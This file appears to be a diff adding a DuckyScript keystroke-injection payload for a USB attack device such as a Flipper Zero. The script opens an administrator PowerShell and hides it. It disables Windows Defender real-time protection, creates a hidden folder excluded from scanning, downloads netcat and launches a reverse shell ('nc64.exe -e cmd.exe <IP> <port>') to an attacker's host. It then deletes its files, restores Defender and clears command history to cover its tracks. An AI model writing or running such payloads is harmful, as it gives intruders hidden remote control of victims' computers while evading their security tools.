@@ -1,0 +1,63 @@
+REM Script made by redhammer
+REM Open Powershell as Admin
+DEFAULT_DELAY 300
+DELAY 1000
+GUI r
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2000
+TAB
+DELAY 100
+TAB
+ENTER
+DELAY 1000
+REM
+REM Hide Powershell (Remember to extract Flipper only when it displays 100%)
+STRING PowerShell.exe -WindowStyle hidden
+ENTER
+REM
+REM Disable real time protection
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+REM
+REM Create a tmp directory in Downloads folder
+STRING $dir = "C:\temp"
+ENTER
+STRING New-Item -ItemType Directory -Path $dir
+ENTER
+REM
+REM Add an exception to Windows Defender for the tmp directory
+STRING Add-MpPreference -ExclusionPath $dir
+ENTER
+REM
+REM Hide the directory
+STRING $hide = Get-Item $dir -Force
+ENTER
+STRING $hide.attributes='Hidden'
+ENTER
+STRING cd $dir
+ENTER
+REM
+STRING Invoke-WebRequest -Uri "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip" -OutFile "$dir\nc.zip"
+ENTER
+REM
+REM Unzip the folder
+STRING tar -xf nc.zip
+ENTER
+REM Execute the nc64.exe
+STRING ./nc64.exe -e C:\Windows\System32\cmd.exe <IP> <port>
+ENTER
+REM
+REM Clean up
+STRING Remove-Item -Path $dir -Recurse -Force
+ENTER
+STRING Set-MpPreference -DisableRealtimeMonitoring $false
+ENTER
+STRING Remove-MpPreference -ExclusionPath $dir
+ENTER
+REM
+REM Remove the script from the system and exit from powershell
+STRING Clear-History
+ENTER
+STRING exit
+ENTER
